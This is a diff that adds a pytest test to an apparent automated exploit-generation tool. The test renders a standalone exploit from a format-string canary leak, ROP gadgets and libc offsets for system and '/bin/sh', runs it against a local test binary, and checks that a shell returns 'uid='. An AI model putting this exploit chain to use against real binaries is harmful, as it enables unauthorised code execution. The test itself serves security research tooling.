@@ -376,3 +376,23 @@ def test_strategy_auto_pie_ret2libc(store, case, pool, pie_fmtleak_bin):
     pocs = PocDAO(store.conn).list_by_target(t.id)
     assert any(pc.level == "L3" and pc.verified for pc in pocs), \
         f"strategy=auto did not auto-solve PIE ret2libc (pocs={[(p.level, p.verified) for p in pocs]})"
+
+
+def test_render_canary_script_reproduces_shell(canary_bin, tmp_path):
+    """The bundled standalone reproducer (render_canary_script) leaks the canary, defeats ASLR via
+    the puts leak, and pops a shell on its own -- the canary L3 bundle is self-reproducing (it used
+    to ship a placeholder that could not run)."""
+    import subprocess as sp
+    from lykos.analyze.poc import exploit as ex
+    data = canary_bin.read_bytes()
+    ld = open(_SYS_LIBC, "rb").read()
+    syms = rop.libc_symbols(ld, ("puts", "system"))
+    script = leak.render_canary_script(
+        canary_offset=72, ret_offset=88, canary_trigger=b"%p" + b".%p" * 19 + b"\n",
+        pop_rdi=rop.find_gadget(data, "pop_rdi"), puts_plt=rop.resolve_plt(str(canary_bin), "puts"),
+        puts_got=rop.got_entry(data, "puts"), ret_to=ex.elf_functions(data).get("main"),
+        puts_off=syms["puts"], system_off=syms["system"], binsh_off=rop.find_string(ld, b"/bin/sh"),
+        ret_gadget=rop.find_gadget(data, "ret"), loop_feed=b"A\n")
+    sf = tmp_path / "exploit.py"; sf.write_bytes(script)
+    r = sp.run(["python3", str(sf), str(canary_bin)], capture_output=True, timeout=60)
+    assert r.returncode == 0 and b"uid=" in r.stdout, (r.stdout[:200], r.stderr[:200])
